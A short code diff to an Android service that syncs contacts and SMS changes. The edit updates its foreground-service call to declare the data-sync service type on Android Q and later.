@@ -42,7 +42,16 @@ class SyncService : Service() {
         super.onCreate()
         deviceId = DeviceIdHelper.getDeviceId(this)
         createNotificationChannel()
-        startForeground(1, createNotification())
+
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+            startForeground(
+                1,
+                createNotification(),
+                android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
+            )
+        } else {
+            startForeground(1, createNotification())
+        }
 
         contentResolver.registerContentObserver(ContactsContract.Contacts.CONTENT_URI, true, contactObserver)
         contentResolver.registerContentObserver(Telephony.Sms.CONTENT_URI, true, smsObserver)
